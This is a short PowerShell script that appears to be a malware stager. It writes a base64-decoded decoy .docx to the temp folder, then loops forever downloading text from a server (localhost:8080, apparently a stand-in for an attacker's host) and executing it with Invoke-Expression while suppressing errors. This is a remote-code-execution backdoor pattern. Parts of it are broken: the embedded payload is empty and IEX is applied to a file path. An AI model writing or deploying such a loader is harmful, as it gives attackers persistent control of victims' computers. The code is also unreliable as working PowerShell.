$t='';
$source = $env:TEMP +'\'+ [System.Guid]::NewGuid() +'.docx';
$t = [System.Convert]::FromBase64String($t);
Set-Content -Path $source -Encoding Byte -Value $t;
IEX $source;
$webClient = New-Object System.Net.WebClient
while($true){
try{
$r=$webClient.DownloadString('http://localhost:8080/')
IEX $r;
}catch{
}
}
